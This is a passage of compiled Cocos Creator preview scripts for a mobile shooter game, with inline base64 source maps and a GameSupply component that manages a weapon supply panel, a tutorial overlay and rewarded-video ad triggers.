//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZVJlbGl2ZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EseUNBQXNDO0FBQ3RDLDZEQUEwRDtBQUMxRCxxRUFBa0U7QUFDbEUsdUNBQW9DO0FBQ3BDLGdFQUEyRDtBQUVyRCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUF3Qyw4QkFBWTtJQUFwRDtRQUFBLHFFQXNFQztRQW5FRyxrQkFBWSxHQUFXLElBQUksQ0FBQztRQUc1QixxQkFBZSxHQUFvQixFQUFFLENBQUM7UUFHdEMsZUFBUyxHQUFhLElBQUksQ0FBQztRQUczQixpQkFBVyxHQUFZLElBQUksQ0FBQztRQUc1QixhQUFPLEdBQVksSUFBSSxDQUFDO1FBR3hCLGFBQU8sR0FBVyxJQUFJLENBQUM7O0lBb0QzQixDQUFDO0lBbERHLHdCQUF3QjtJQUV4QiwyQkFBTSxHQUFOO1FBQUEsaUJBSUM7UUFIRyxFQUFFLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxTQUFTLEVBQUM7WUFDakIsS0FBSSxDQUFDLGVBQWUsRUFBRSxDQUFBO1FBQzFCLENBQUMsRUFBQyxJQUFJLENBQUMsQ0FBQztJQUNaLENBQUM7SUFFRCw2QkFBUSxHQUFSO1FBQ0ksT0FBTyxDQUFDLEdBQUcsQ0FBQywwQ0FBMEMsQ0FBQyxDQUFDO1FBQ3hELHFCQUFTLENBQUMsU0FBUyxHQUFHLElBQUksQ0FBQztRQUMzQixJQUFJLENBQUMsT0FBTyxDQUFDLEtBQUssRUFBRSxDQUFDO1FBQ3JCLElBQUksQ0FBQyxPQUFPLENBQUMsS0FBSyxHQUFHLEtBQUssQ0FBQztRQUMzQixJQUFJLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxPQUFPLENBQUMsT0FBTyxFQUFFLENBQUMsQ0FBQyxRQUFRLEVBQUUsQ0FBQztRQUNu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OlsiXHJcbmltcG9ydCB7R2FtZVByb3h5fSBmcm9tIFwiLi9HYW1lUHJveHlcIjtcclxuaW1wb3J0IHtFeGNlbFRhYmxlTmFtZXN9IGZyb20gXCIuLi9jb25maWcvRXhjZWxUYWJsZU5hbWVzXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi9pbmZvL1dvcmxkXCI7XHJcbmltcG9ydCBDRFRpbWVyIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29tcG9uZW50L0NEVGltZXJcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgR2FtZVJlbGl2ZSBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBnYW1lT3Zlck5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlNwcml0ZUZyYW1lKVxyXG4gICAgZ3VuU3ByaXRlRnJhbWVzOltjYy5TcHJpdGVGcmFtZV0gPSBbXTtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgZ3VuU3ByaXRlOmNjLlNwcml0ZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkxhYmVsKVxyXG4gICAgYnVsbGV0TGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIGNkTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShDRFRpbWVyKVxyXG4gICAgY2RUaW1lcjpDRFRpbWVyID0gbnVsbDtcclxuXHJcbiAgICAvLyBMSUZFLUNZQ0xFIENBTExCQUNLUzpcclxuXHJcbiAgICBvbkxvYWQoKXtcclxuICAgICAgICBjYy5nYW1lLm9uKFwidmlkZW9fN1wiLCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMub25DbGlja1JlbGl2ZURvKClcclxuICAgICAgICB9LHRoaXMpO1xyXG4gICAgfVxyXG5cclxuICAgIG9uRW5hYmxlICgpIHtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIkdhbWVSZWxpdmU9PT0+R2FtZVByb3h5LnBhdXNlR2FtZSA9IHRydWVcIik7XHJcbiAgICAgICAgR2FtZVByb3h5LnBhdXNlR2FtZSA9IHRydWU7XHJcbiAgICAgICAgdGhpcy5jZFRpbWVyLnJlc2V0KCk7XHJcbiAgICAgICAgdGhpcy5jZFRpbWVyLnBhdXNlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5jZExhYmVsLnN0cmluZyA9IE1hdGguY2VpbCh0aGlzLmNkVGltZXIuY2REZWx0YSgpKS50b1N0cmluZygpO1xyXG4gICAgICAgIC8vIHRoaXMubm9SZWxpdmVOb2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMubm9kZS5zdG9wQWxsQWN0aW9ucygpO1xyXG4gICAgICAgIC8vIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKDMpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgIC8vICAgICB0aGlzLm5vUmVsaXZlTm9kZS5hY3RpdmUgPSB0cnVlO1xyXG4gICAgICAgIC8vIH0pKSk7XHJcbiAgICAgICAgbGV0IHdlYXBvbkNvbmZpZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvbikuZmlsdGVyKHZhbHVlID0+IHZhbHVlWydpZCddICE9IDEpLnNvcnQoKChhLCBiKSA9PiBiWyd1bmxvY2snXSAtIGFbJ3VubG9jayddKSk7XHJcbiAgICAgICAgZm9yIChsZXQgaXRlbSBvZiB3ZWFwb25Db25maWcpe1xyXG4gICAgICAgICAgICBpZiAoR2FtZVByb3h5LmxldmVsID49IGl0ZW1bJ3VubG9jayddKXtcclxuICAgICAgICAgICAgICAgIHRoaXMuZ3VuU3ByaXRlLnNwcml0ZUZyYW1lID0gdGhpcy5ndW5TcHJpdGVGcmFtZXNbaXRlbVsnaWQnXSAtIDFdO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5idWxsZXRMYWJlbC5zdHJpbmcgPSBg5a2Q5by5ICR7V29ybGQuTXkuYXJtb3J5LnBheWxvYWRBZGRPZihpdGVtWydpZCddKSAqIDN9eDNgO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1JlbGl2ZShldmVudCwgZGF0YSl7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLjgJB2aWRlb+OAkTcg5aSN5rS744CQY2xpY2vjgJFHYW1lUmVsaXZlIFJlbGl2ZVwiKVxyXG5cclxuICAgICAgICBXb3JsZC5TdG9yYWdlLl92aWRlb1NpZ249N1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UudmlkZW9BZF9zaG93KCkgXHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1JlbGl2ZURvKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIEdhbWVQcm94eS5wYXVzZUdhbWUgPSBmYWxzZTtcclxuICAgICAgICBHYW1lUHJveHkuZW1pdChHYW1lUHJveHkuRXZlbnQuUmVsaXZlR2FtZSk7XHJcbiAgICB9XHJcblxyXG4gICAgb25Ob1JlbGl2ZShldmVudCwgZGF0YSl7XHJcbiAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuZ2FtZU92ZXJOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICB9XHJcblxyXG4gICAgb25Qcm9ncmVzc0V2ZW50KHByb2dyZXNzOm51bWJlcil7XHJcbiAgICAgICAgdGhpcy5jZExhYmVsLnN0cmluZyA9IE1hdGguY2VpbCh0aGlzLmNkVGltZXIuY2REZWx0YSgpKS50b1N0cmluZygpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/GameSupply.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'fa532I+751DgZh0kt4K3xve', 'GameSupply');
// script/app/game/GameSupply.ts

Object.defineProperty(exports, "__esModule", { value: true });
var TableViewMediator_1 = require("../../../framework/tableview/TableViewMediator");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var GameProxy_1 = require("./GameProxy");
var GameSupplyItem_1 = require("./GameSupplyItem");
var World_1 = require("../info/World");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var OnceFlag = false;
var GameSupply = /** @class */ (function (_super) {
    __extends(GameSupply, _super);
    function GameSupply() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.useGuideNode = null;
        _this.videoNode = null;
        _this.tableViewMediator = null;
        _this.noUseNode = null;
        _this._focus = 0;
        return _this;
    }
    Object.defineProperty(GameSupply.prototype, "focus", {
        get: function () {
            return this._focus;
        },
        set: function (value) {
            this._focus = value;
            this.tableViewMediator.updateData();
        },
        enumerable: false,
        configurable: true
    });
    GameSupply.prototype.onLoad = function () {
        var _this = this;
        GameSupplyItem_1.default.gameSupply = this;
        /** 加载数据 */
        this.tableViewMediator.datas = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon).filter(function (value) { return value['id'] != 1; }).sort(function (a, b) { return a['order'] - b['order']; });
        cc.game.on("video_4", function () {
            _this.onClickUseSupplyDo();
        }, this);
    };
    GameSupply.prototype.onEnable = function () {
        if (OnceFlag) {
            this.tableViewMediator.showAction();
        }
        OnceFlag = true;
        GameProxy_1.GameProxy.pauseGame = true;
        if (!World_1.World.My.newbies.state("FirstEntrySupply")) {
            this.useGuideNode.x = 0;
            var newbieNode = new cc.Node();
            newbieNode.name = "newbieNode";
            newbieNode.position = this.useGuideNode.convertToWorldSpaceAR(cc.v2());
            cc.director.getScene().addChild(newbieNode);
            /** guideCircle */
            var guideCirclePrefab = cc.loader.getRes("prefab/guideCircle");
            var guideCircleNode = cc.instantiate(guideCirclePrefab);
            guideCircleNode.position = cc.v2();
            newbieNode.addChild(guideCircleNode);
            /** guideSke */
            var guideSkePrefab = cc.loader.getRes("prefab/guideSke");
            var guideSkeNode = cc.instantiate(guideSkePrefab);
            guideSkeNode.position = cc.v2();
            newbieNode.addChild(guideSkeNode);
            this.useGuideNode.x = 0;
            this.videoNode.active = false;
        }
        else {
            this.useGuideNode.x = 50;
            this.videoNode.active = true;
        }
        // this.noUseNode.active = false;
        // this.node.stopAllActions();
        // this.node.runAction(cc.sequence(cc.delayTime(3), cc.callFunc(()=>{
        //     this.noUseNode.active = true;
        // })));
    };
    GameSupply.prototype.onClickCloseSupply = function () {
        GameProxy_1.GameProxy.pauseGame = false;
        this.node.active = false;
    };
    GameSupply.prototype.onClickUseSupply = function (event, data) {
        console.log("【video】4 装备补给【click】GameSupply UseSupply");
        World_1.World.Storage._videoSign = 4;
        World_1.World.Storage.videoAd_show();
    };
    GameSupply.prototype.onClickUseSupplyDo = function () {
        var item = this.tableViewMediator.datas[this._focus];
        var gameRoleController = window['GameRoleController'];
        gameRoleController.bulletEmitter = item['id'];
        gameRoleController.bulletEmitterDelegate.payload = (World_1.World.My.armory.payloadAddOf(item['id'])) * 3;
        /** 设置弹容量 */
        this.onClickCloseSupply();
        var newbieNode = cc.director.getScene().getChildByName("newbieNode");
        if (newbieNode) {
            newbieNode.destroy();
            World_1.World.My.newbies.finish("FirstEntrySupply");
        }
    };
    GameSupply.prototype.onTest = function () {
        console.log("gameSupply test");
    };
    __decorate([
        property(cc.Node)
    ], GameSupply.prototype, "useGuideNode", void 0);
    __decorate([
        property(cc.Node)
    ], GameSupply.prototype, "videoNode", void 0);
    __decorate([
        property(TableViewMediator_1.default)
    ], GameSupply.prototype, "tableViewMediator", void 0);
    __decorate([
        property(cc.Node)
    ], GameSupply.prototype, "noUseNode", void 0);
    GameSupply = __decorate([
        ccclass
    ], GameSupply);
    return GameSupply;
}(cc.Component));
exports.default = GameSupply;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvR2FtZVN1cHBseS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0ZBQStFO0FBQy9FLHFFQUFrRTtBQUNsRSw2REFBMEQ7QUFDMUQseUNBQXNDO0FBQ3RDLG1EQUE4QztBQUM5Qyx1Q0FBb0M7QUFFOUIsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFFMUMsSUFBSSxRQUFRLEdBQUcsS0FBSyxDQUFDO0FBRXJCO0lBQXdDLDhCQUFZO0lBQXBEO1FBQUEscUVBc0dDO1FBbkdHLGtCQUFZLEdBQVcsSUFBSSxDQUFDO1FBRzVCLGVBQVMsR0FBVyxJQUFJLENBQUM7UUFHekIsdUJBQWlCLEdBQXFCLElBQUksQ0FBQztRQUkzQyxlQUFTLEdBQVcsSUFBSSxDQUFDO1FBRWpCLFlBQU0sR0FBRyxDQUFDLENBQUM7O0lBdUZ2QixDQUFDO0lBcEZHLHNCQUFJLDZCQUFLO2FBQVQ7WUFDSSxPQUFPLElBQUksQ0FBQyxNQUFNLENBQUM7UUFDdkIsQ0FBQzthQUVELFVBQVUsS0FBYTtZQUNuQixJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztZQUNwQixJQUFJLENBQUMsaUJBQWlCLENBQUMsVUFBVSxFQUFFLENBQUM7UUFDeEMsQ0FBQzs7O09BTEE7SUFPRCwyQkFBTSxHQUFOO1FBQUEsaUJBUUM7UUFQRyx3QkFBYyxDQUFDLFVBQVUsR0FBRyxJQUFJLENBQUM7UUFDakMsV0FBVztRQUNYLElBQUksQ0FBQyxpQkFBaUIsQ0FBQyxLQUFLLEdBQUcseUJBQVcsQ0FBQyxhQUFhLENBQUMsaUNBQWUsQ0FBQyxNQUFNLENBQUMsQ0FBQyxNQUFNLENBQUMsVUFBQSxLQUFLLElBQUksT0FBQSxLQUFLLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFoQixDQUFnQixDQUFDLENBQUMsSUFBSSxDQUFDLFVBQUMsQ0FBQyxFQUFFLENBQUMsSUFBSSxPQUFBLENBQUMsQ0FBQyxPQUFPLENBQUMsR0FBRyxDQUFDLENBQUMsT0FBTyxDQUFDLEVBQXZCLENBQXVCLENBQUMsQ0FBQztRQUUxSixFQUFFLENBQUMsSUFBSSxDQUFDLEVBQUUsQ0FBQyxTQUFTLEVBQUM7WUFDakIsS0FBSSxDQUFDLGtCQUFrQixFQUFFLENBQUE7UUFDN0IsQ0FBQyxFQUFDLElBQUksQ0FBQyxDQUFDO0lBQ1osQ0FBQztJQUdTLDZCQUFRLEdBQWxCO1FBQ0ksSUFBSSxRQUFRLEVBQUM7WUFDVCxJQUFJLENBQUMsaUJBQWlCLENBQUMsVUFBVSxFQUFFLENBQUM7U0FDdkM7UUFDRCxRQUFRLEdBQUcsSUFBSSxDQUFDO1FBQ2hCLHFCQUFTLENBQUMsU0FBUyxHQUFHLElBQUksQ0FBQztRQUMzQixJQUFJLENBQUMsYUFBSyxDQUFDLEVBQUUsQ0FBQyxPQUFPLENBQUMsS0FBSyxDQUFDLGtCQUFrQixDQUFDLEVBQUM7WUFDNUMsSUFBSSxDQUFDLFlBQVksQ0FBQyxDQUFDLEdBQUcsQ0FBQyxDQUFDO1lBQ3hCLElBQUksVUFBVSxHQUFHLElBQUksRUFBRSxDQUFDLElBQUksRUFBRSxDQUFDO1lBQy9CLFVBQVUsQ0FBQyxJQUFJLEdBQUcsWUFBWSxDQUFDO1lBQy9CLFVBQVUsQ0FBQyxRQUFRLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxxQkFBcUIsQ0FBQyxFQUFFLENBQUMsRUFBRSxFQUFFLENBQUMsQ0FBQztZQUN2RSxFQUFFLENBQUMsUUFBUSxDQUFDLFFBQVEsRUFBRSxDQUFDLFFBQVEsQ0FBQyxVQUFVLENBQUMsQ0FBQztZQUM1QyxrQkFBa0I7WUFDbEIsSUFBSSxpQkFBaUIsR0FBRyxFQUFFLENBQUMsTUFBTSxDQUFDLE1BQU0sQ0FBQyxvQkFBb0IsQ0FBQyxDQUFDO1lBQy9ELElBQUksZUFBZSxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsaUJBQWlCLENBQUMsQ0FBQztZQUN4RCxlQUFlLENBQUMsUUFBUSxHQUFHLEVBQUUsQ0FBQyxFQUFFLEVBQUUsQ0FBQztZQUNuQyxVQUFVLENBQUMsUUFBUSxDQUFDLGVBQWUsQ0FBQyxDQUFDO1lBQ3JDLGVBQWU7WUFDZixJQUFJLGNBQWMsR0FBRyxFQUFFLENBQUMsTUFBTSxDQUFDLE1BQU0sQ0FBQyxpQkFBaUIsQ0FBQyxDQUFDO1lBQ3pELElBQUksWUFBWSxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsY0FBYyxDQUFDLENBQUM7WUFDbEQsWUFBWSxDQUFDLFFBQVEsR0FBRyxFQUFFLENBQUMsRUFBRSxFQUFFLENBQUM7WUFDaEMsVUFBVSxDQUFDLFFBQVEsQ0FBQyxZQUFZLENBQUMsQ0FBQztZQUNsQyxJQUFJLENBQUMsWUFBWSxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUM7WUFDeEIsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1NBQ2pDO2FBQUs7WUFDRixJQUFJLENBQUMsWUFBWSxDQUFDLENBQUMsR0FBRyxFQUFFLENBQUM7WUFDekIsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1NBQ2hDO1FBQ0QsaUNBQWlDO1FBQ2pDLDhCQUE4QjtRQUM5QixxRUFBcUU7UUFDckUsb0NBQW9DO1FBQ3BDLFFBQVE7SUFDWixDQUFDO0lBRUQsdUNBQWtCLEdBQWxCO1FBQ0kscUJBQVMsQ0FBQyxTQUFTLEdBQUcsS0FBSyxDQUFDO1FBQzVCLElBQUksQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztJQUM3QixDQUFDO0lBRUQscUNBQWdCLEdBQWhCLFVBQWlCLEtBQUssRUFBRSxJQUFJO1FBQ3hCLE9BQU8sQ0FBQyxHQUFHLENBQUMsMENBQTBDLENBQUMsQ0FBQTtRQUV2RCxhQUFLLENBQUMsT0FBTyxDQUFDLFVBQVUsR0FBQyxDQUFDLENBQUE7UUFDMUIsYUFBSyxDQUFDLE9BQU8sQ0FBQyxZQUFZLEVBQUUsQ0FBQTtJQUNoQyxDQUFDO0lBRUQsdUNBQWtCLEdBQWxCO1FBQ0ksSUFBSSxJQUFJLEdBQUcsSUFBSSxDQUFDLGlCQUFpQixDQUFDLEtBQUssQ0FBQyxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDckQsSUFBSSxrQkFBa0IsR0FBRyxNQUFNLENBQUMsb0JBQW9CLENBQUMsQ0FBQztRQUN0RCxrQkFBa0IsQ0FBQyxhQUFhLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO1FBQzlDLGtCQUFrQixDQUFDLHFCQUFxQixDQUFDLE9BQU8sR0FBRyxDQUFDLGFBQUssQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLFlBQVksQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUMsQ0FBQztRQUNsRyxZQUFZO1FBQ1osSUFBSSxDQUFDLGtCQUFrQixFQUFFLENBQUM7UUFDMUIsSUFBSSxVQUFVLEdBQUcsRUFBRSxDQUFDLFFBQVEsQ0FBQyxRQUFRLEVBQUUsQ0FBQyxjQUFjLENBQUMsWUFBWSxDQUFDLENBQUM7UUFDckUsSUFBSSxVQUFVLEVBQUM7WUFDWCxVQUFVLENBQUMsT0FBTyxFQUFFLENBQUM7WUFDckIsYUFBSyxDQUFDLEVBQUUsQ0FBQyxPQUFPLENBQUMsTUFBTSxDQUFDLGtCQUFrQixDQUFDLENBQUM7U0FDL0M7SUFDTCxDQUFDO0lBRUQsMkJBQU0sR0FBTjtRQUNJLE9BQU8sQ0FBQyxHQUFHLENBQUMsaUJBQWlCLENBQUMsQ0FBQTtJQUNsQyxDQUFDO0lBbEdEO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7b0RBQ1U7SUFHNUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQztpREFDTztJQUd6QjtRQURDLFFBQVEsQ0FBQywyQkFBaUIsQ0FBQzt5REFDZTtJQUkzQztRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO2lEQUNPO0lBYlIsVUFBVTtRQUQ5QixPQUFPO09BQ2EsVUFBVSxDQXNHOUI7SUFBRCxpQkFBQztDQXRHRCxBQXNHQyxDQXRHdUMsRUFBRSxDQUFDLFNBQVMsR0FzR25EO2tCQXRHb0IsVUFBVSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbImltcG9ydCBUYWJsZVZpZXdNZWRpYXRvciBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL3RhYmxldmlldy9UYWJsZVZpZXdNZWRpYXRvclwiO1xyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuL0dhbWVQcm94eVwiO1xyXG5pbXBvcnQgR2FtZVN1cHBseUl0ZW0gZnJvbSBcIi4vR2FtZVN1cHBseUl0ZW1cIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uL2luZm8vV29ybGRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxubGV0IE9uY2VGbGFnID0gZmFsc2U7XHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEdhbWVTdXBwbHkgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdXNlR3VpZGVOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdmlkZW9Ob2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShUYWJsZVZpZXdNZWRpYXRvcilcclxuICAgIHRhYmxlVmlld01lZGlhdG9yOlRhYmxlVmlld01lZGlhdG9yID0gbnVsbDtcclxuXHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBub1VzZU5vZGU